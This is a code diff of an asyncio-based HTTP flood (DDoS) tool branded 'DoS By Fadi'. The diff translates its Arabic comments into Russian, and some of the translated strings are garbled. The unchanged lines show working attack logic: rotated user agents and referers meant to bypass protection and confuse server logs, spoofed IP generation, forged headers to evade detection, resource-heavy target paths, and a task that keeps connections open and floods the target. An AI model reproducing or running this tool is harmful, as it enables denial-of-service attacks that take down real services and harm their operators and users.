@@ -6,19 +6,18 @@ import random
 import time
 import urllib.parse
 import sys
-
-# توفير إرشادات لمكتبة PySocks في حالة الرغبة في استخدام بروكسي SOCKS5 مع asyncio.
-# يتطلب ذلك مكتبات إضافية مثل 'aiohttp_socks' أو تنفيذ جسر يدوي.
-# لتجنب التعقيد الغير ضروري في هذا التنفيذ الخام والعدواني، سنركز على الاتصال المباشر.
-# هذا التنفيذ يركز على استنزاف الموارد مباشرة، والتحكم في الاتصال عبر البروكسي يتطلب بنية أكثر تعقيداً.
-# متغيرات عامة للإحصائيات والتحكم
+# Предоставляет инструкции для библиотеки PySocks, если вы хотите использовать SOCKS5-прокси с asyncio.
+# Для этого требуются дополнительные библиотеки, такие как 'aiohttp_socks', или реализация моста вручную.
+# Чтобы избежать излишней сложности в этой грубой и агрессивной реализации, мы сосредоточимся на прямом соединении.
+# Эта реализация ориентирована на прямое потребление ресурсов, а управление соединением через прокси требует более сложной архитектуры.
+# Глобальные переменные для статистики и управления
 requests_sent = 0
 connections_active = 0
 errors_encountered = 0
 start_time = time.time()
-stop_attack = asyncio.Event() # حدث للإشارة إلى المهام بالتوقف
+stop_attack = asyncio.Event() # Событие для индикации выполнения задач путем остановки
 
-# قائمة User-Agent قوية ومُحدّثة لمحاكاة متصفحات متعددة وتجاوز الحماية المتقدمة
+# Мощный и актуальный список User-Agent для эмуляции работы нескольких браузеров и обхода расширенной защиты.
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
@@ -47,7 +46,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
 ]
 
-# قائمة بعناوين URL محتملة للمراجع (Referer) لجعل الطلبات تبدو أكثر شرعية أو لخلط سجلات الخادم
+# Список возможных URL-адресов-источников, позволяющих сделать запросы более легитимными или запутать журналы сервера
 REFERERS = [
     "https://www.google.com/?q=",
     "https://www.bing.com/search?q=",
@@ -71,7 +70,7 @@ REFERERS = [
     "https://discord.com/",
 ]
 
-# قائمة بالمسارات الشائعة والملفات الافتراضية التي قد تستنزف موارد الخادم
+# Список распространенных путей и файлов по умолчанию, которые могут потреблять ресурсы сервера.
 COMMON_PATHS = [
     "/", "/index.html", "/default.html", "/home", "/login", "/admin", "/panel", "/phpmyadmin",
     "/sitemap.xml", "/robots.txt", "/wp-login.php", "/wp-admin/", "/.env", "/config.php",
@@ -92,11 +91,11 @@ def generate_spoofed_ip():
 
 async def send_raw_http_request(writer, host, path, method, post_data=None):
     """
-    بناء وإرسال طلب HTTP خام عبر asyncio.StreamWriter.
+   Сформируйте и отправьте необработанный HTTP-запрос с помощью asyncio.StreamWriter.
     """
     global requests_sent
 
-    # رؤوس HTTP متقدمة ومزيفة لخداع أنظمة الكشف وإرهاق الخادم
+    # Расширенные и поддельные HTTP-заголовки для обмана систем обнаружения и перегрузки сервера
     request_headers = {
         "Host": host,
         "User-Agent": random.choice(USER_AGENTS),
@@ -145,8 +144,8 @@ async def send_raw_http_request(writer, host, path, method, post_data=None):
 
 async def ddos_task(target_host, target_port, base_path, use_ssl):
     """
-    مهمة asyncio لإرسال طلبات DDoS مستمرة وعدوانية.
-    تحافظ على الاتصال مفتوحًا وترسل طلبات متعددة عبره.
+    Задача asyncio — отправлять постоянные и агрессивные DDoS-запросы.
+    Она поддерживает соединение открытым и отправляет через него множество запросов.
     """
     global connections_active, errors_encountered
 
@@ -236,7 +235,7 @@ async def ddos_task(target_host, target_port, base_path, use_ssl):
 
 async def main():
     """
-    الوظيفة الرئيسية لبدء الهجوم باستخدام asyncio.
+    Основная функция заключается в инициировании атаки с использованием asyncio.
     """
     print("\n\033[1;31m  𝗗𝗼𝗦 𝗕𝘆 𝗙𝗮𝗱𝗶  \033[0m")
     print("\033[1;34m\033[0m")
@@ -282,30 +281,29 @@ async def main():
         task = asyncio.create_task(ddos_task(host, port, path, use_ssl))
         tasks.append(task)
 
-    # مهمة لعرض الإحصائيات
+    # Важно отображать статистику
     async def stats_reporter():
         while not stop_attack.is_set():
             elapsed_time = time.time() - start_time
             rps = requests_sent / elapsed_time if elapsed_time > 0 else 0
-            
-            # استخدام أكواد ANSI لتنظيف السطر وإخراج ملون لزيادة التأثير البصري
-            sys.stdout.write(f"\r\033[K[anonymous] الطلبات: \033[1;32m{requests_sent:,}\033[0m | معدل الطلبات: \033[1;33m{rps:,.2f} ط.ث\033[0m | أخطاء: \033[1;31m{errors_encountered:,}\033[0m | اتصالات نشطة: \033[1;36m{connections_active}\033[0m")
+            # Использование кодов ANSI для очистки линий и цветокоррекции с целью усиления визуального эффекта
+            sys.stdout.write(f"\r\033[K[anonymous] Запросы: \033[1;32m{requests_sent:,}\033[0m | Запросить ставку: \033[1;33m{rps:,.2f} ط.ث\033[0m | ошибкаء: \033[1;31m{errors_encountered:,}\033[0m | اАктивные соединения: \033[1;36m{connections_active}\033[0m")
             sys.stdout.flush()
             await asyncio.sleep(1)
-        sys.stdout.write("\n") # لضمان ظهور سطر جديد بعد توقف المهاجم
+        sys.stdout.write("\n") # Чтобы гарантировать появление новой строки после остановки злоумышленника
         sys.stdout.flush()
 
     stats_task = asyncio.create_task(stats_reporter())
     tasks.append(stats_task)
 
     try:
-        # انتظر حتى تكتمل جميع المهام أو يتم إلغاؤها عند الإيقاف.
-        # قد لا يعود asyncio.gather حتى بعد إشارة الإيقاف إذا كانت هناك مهام لا تنتهي.
+        # Дождитесь завершения всех задач или их отмены при остановке.
+        # asyncio.gather может не возвращать управление даже после сигнала остановки, если есть незавершенные задачи..
         await asyncio.gather(*tasks, return_exceptions=True) 
     except asyncio.CancelledError:
-        pass # سيحدث هذا عند إلغاء المهام عند الإيقاف
+        pass #Это произойдет, если задачи будут отменены при завершении работы системы.
     finally:
-        # التأكد من إيقاف جميع المهام بعد إلغائها
+        # После отмены всех задач обязательно остановите их.
         pass
 
 
@@ -313,21 +311,21 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        sys.stdout.write("\n\033[1;31m[anonymous] تلقى أمر إيقاف (Ctrl+C). جاري إنهاء الهجوم...\033[0m\n")
+        sys.stdout.write("\n\033[1;31m[anonymous]Получен приказ о приостановке работ. (Ctrl+C). Атака прекращается....\033[0m\n")
         sys.stdout.flush()
-        stop_attack.set() # إرسال إشارة التوقف لجميع المهام
-        # إلغاء جميع المهام المتبقية بشكل قسري لضمان الإنهاء السريع.
-        # هذه خطوة حاسمة في بيئات asyncio عند الحاجة إلى إنهاء فوري.
+        stop_attack.set() # Отправить сигнал остановки всем задачам
+        # Принудительно отменить все оставшиеся задачи для обеспечения быстрого завершения.
+        # Это важный шаг в синхронных средах, когда требуется немедленное завершение.
         pending_tasks = asyncio.all_tasks()
         for task in pending_tasks:
             task.cancel()
-        # انتظر بصبر حتى يتم إلغاء المهام والتعامل مع استثناءات الإلغاء.
-        # قد نحتاج إلى مهلة قصيرة إذا كانت بعض المهام لا تستجيب فوراً.
+        # Пожалуйста, подождите, пока задачи будут отменены и обработаны исключения, связанные с отменой.
+        # В случае, если некоторые задачи не отвечают немедленно, нам может потребоваться небольшой отсроченный период..
         try:
             asyncio.get_event_loop().run_until_complete(asyncio.gather(*pending_tasks, return_exceptions=True))
         except RuntimeError:
-            pass # قد تحدث هذه عند محاولة run_until_complete بعد إغلاق اللوب
+            pass #Это может произойти при попытке выполнить run_until_complete после завершения цикла.
         sys.exit(0)
     except Exception as e:
-        sys.stderr.write(f"\n\033[1;31m[anonymous] خطأ فادح في التنفيذ: {e}\033[0m\n")
+        sys.stderr.write(f"\n\033[1;31m[anonymous] Серьезная ошибка в реализации.: {e}\033[0m\n")
         sys.exit(1)
